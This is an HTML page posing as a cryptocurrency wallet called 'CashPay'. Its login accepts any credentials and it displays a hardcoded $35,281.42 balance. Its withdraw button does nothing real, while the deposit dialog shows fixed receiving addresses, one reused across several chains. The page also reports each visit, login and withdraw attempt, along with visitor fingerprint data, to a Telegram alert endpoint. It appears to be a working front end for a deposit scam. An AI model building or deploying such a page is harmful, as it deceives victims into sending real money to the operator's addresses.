<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CashPay Wallet</title><script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script><style>body{margin:0;background:#07090c;color:#f5f7fa;font-family:Arial,sans-serif}button,input,select{font:inherit}.wrap{max-width:660px;margin:auto;padding:30px 18px}.card,.modal{background:#111722;border:1px solid #273244;border-radius:20px;padding:24px;box-shadow:0 20px 60px #0008}.row{display:flex;gap:10px}.row>*{flex:1}.btn{border:0;border-radius:12px;padding:13px;font-weight:700;cursor:pointer;background:#16b981;color:#03120d}.secondary{background:#182131;color:#fff;border:1px solid #304057}.muted{color:#91a0b3}.balance{font-size:42px;font-weight:800;margin:10px 0 24px}.asset{display:flex;justify-content:space-between;padding:15px 0;border-bottom:1px solid #202a39}.asset:last-child{border-bottom:0}.login{max-width:410px;margin:12vh auto;padding:18px}.field{margin:12px 0}.field input{width:100%;padding:13px;background:#080d12;border:1px solid #2a3648;color:#fff;border-radius:11px;box-sizing:border-box}.modal-bg{position:fixed;inset:0;background:#000b;display:none;align-items:center;justify-content:center;padding:20px}.modal-bg.open{display:flex}.modal{width:min(450px,100%)}#qrcode{background:#fff;padding:14px;width:180px;height:180px;margin:15px auto;display:flex;align-items:center;justify-content:center}#qrcode img,#qrcode canvas{max-width:180px;max-height:180px}.addr{word-break:break-all;background:#080d12;padding:12px;border-radius:10px;font-family:monospace}.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}</style></head><body><div id="app"></div><script>
const ADDRESSES={Ethereum:'0xbcafc75cf2157c810cbeb7dcacd4f9635f9fb939',Base:'0xbcafc75cf2157c810cbeb7dcacd4f9635f9fb939',Tron:'TY6raJrBbuopXQB9PvjxUtGrtWbiZupA21',Solana:'FSm6VJPV5nH8vvvFRUjXzHzc259Y3wuqc6cJPxguXin8','BNB Chain':'0xbcafc75cf2157c810cbeb7dcacd4f9635f9fb939',Polygon:'0xbcafc75cf2157c810cbeb7dcacd4f9635f9fb939','Avalanche C-Chain':'0xbcafc75cf2157c810cbeb7dcacd4f9635f9fb939',Bitcoin:'bc1qxy4k2p9m3n7v8t6w5r4e3d2c1a0zxg9h6j2k4m'};
const ASSETS=[['USDT','Tether USD','Ethereum','15,674.00'],['USDC','USD Coin','Base','19,605.80'],['ETH','Ethereum','Base','1.45'],['TRX','TRON','Tron','2.00'],['SOL','Solana','Solana','432.12']];
const state={loggedIn:sessionStorage.getItem('cashpay_logged_in')==='1',network:'Ethereum'};
const ALERT_EVENTS=new Set(['site_opened','login','withdraw']);
function alertEvent(event){
  if(!ALERT_EVENTS.has(event)) return;
  const payload=JSON.stringify({event,page:location.pathname,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:`${screen.width}x${screen.height}`,referrer:document.referrer||'Direct'});
  fetch('/api/telegram-alert',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'same-origin',keepalive:true,body:payload})
    .then(r=>{if(!r.ok) throw new Error(`Telegram alert failed (${r.status})`);return r.json();})
    .then(result=>{if(!result.ok) throw new Error('Telegram alert was rejected');})
    .catch(err=>console.error(`[CashPay] ${event} alert failed`,err));
}
function render(){document.getElementById('app').innerHTML=state.loggedIn?dashboard():login();if(state.loggedIn)wireDashboard();else wireLogin();}
function login(){return `<div class="login"><div class="card"><h1>CashPay</h1><p class="muted">Sign in to your wallet</p><form id="loginForm"><div class="field"><label>Email</label><input id="email" type="email" autocomplete="username" required></div><div class="field"><label>Password</label><input id="password" type="password" autocomplete="current-password" required></div><button class="btn" style="width:100%">Sign in</button></form></div></div>`}
function dashboard(){return `<div class="wrap"><div class="top"><strong>CashPay Wallet</strong><button class="btn secondary" id="logout">Logout</button></div><div class="card"><div class="muted">Total Portfolio Balance</div><div class="balance">$35,281.42</div><div class="row"><button class="btn" id="deposit">Deposit</button><button class="btn secondary" id="withdraw">Withdraw</button></div></div><h3>Your Assets</h3><div class="card">${ASSETS.map(a=>`<div class="asset"><div><strong>${a[0]}</strong><div class="muted">${a[1]} · ${a[2]}</div></div><strong>$${a[3]}</strong></div>`).join('')}</div></div><div class="modal-bg" id="modal"><div class="modal"><div class="top"><h2>Deposit</h2><button class="btn secondary" id="close">Close</button></div><p class="muted">Network</p><select id="network" style="width:100%;padding:12px;background:#080d12;color:#fff;border:1px solid #2a3648;border-radius:10px">${Object.keys(ADDRESSES).map(n=>`<option>${n}</option>`).join('')}</select><div id="qrcode"></div><div class="addr" id="address"></div><button class="btn" id="copy" style="width:100%;margin-top:12px">Copy address</button></div></div>`}
function wireLogin(){document.getElementById('loginForm').addEventListener('submit',e=>{e.preventDefault();state.loggedIn=true;sessionStorage.setItem('cashpay_logged_in','1');alertEvent('login');render();});}
function wireDashboard(){document.getElementById('logout').onclick=()=>{state.loggedIn=false;sessionStorage.removeItem('cashpay_logged_in');render();};document.getElementById('withdraw').onclick=()=>{alertEvent('withdraw');alert('Withdrawal flow opened.');};document.getElementById('deposit').onclick=()=>{document.getElementById('modal').classList.add('open');paintQR();};document.getElementById('close').onclick=()=>document.getElementById('modal').classList.remove('open');document.getElementById('network').onchange=()=>{state.network=document.getElementById('network').value;paintQR();};document.getElementById('copy').onclick=()=>navigator.clipboard.writeText(ADDRESSES[state.network]);}
function paintQR(){const el=document.getElementById('qrcode');el.innerHTML='';const address=ADDRESSES[state.network];new QRCode(el,{text:address,width:180,height:180,colorDark:'#000000',colorLight:'#ffffff',correctLevel:QRCode.CorrectLevel.H});document.getElementById('address').textContent=address;}
render();alertEvent('site_opened');
</script></body></html>
